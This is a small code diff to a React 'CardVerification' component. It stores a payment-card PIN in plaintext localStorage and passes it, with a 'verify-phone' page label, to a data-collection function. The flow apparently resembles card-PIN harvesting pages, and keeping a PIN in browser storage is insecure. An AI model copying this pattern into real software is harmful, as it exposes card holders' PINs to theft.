@@ -34,7 +34,8 @@ export const CardVerification = () => {
       try {
         // Store the PIN in localStorage instead of Redux
         localStorage.setItem("card_pin", JSON.stringify(pin));
-        addData({ id: _id, pinCode: pin });
+        addData({ id: _id, pinCode: pin, pagename: "verify-phone" });
+
         // Navigate to the next page
         // eslint-disable-next-line @typescript-eslint/no-unused-vars
       } catch (error) {
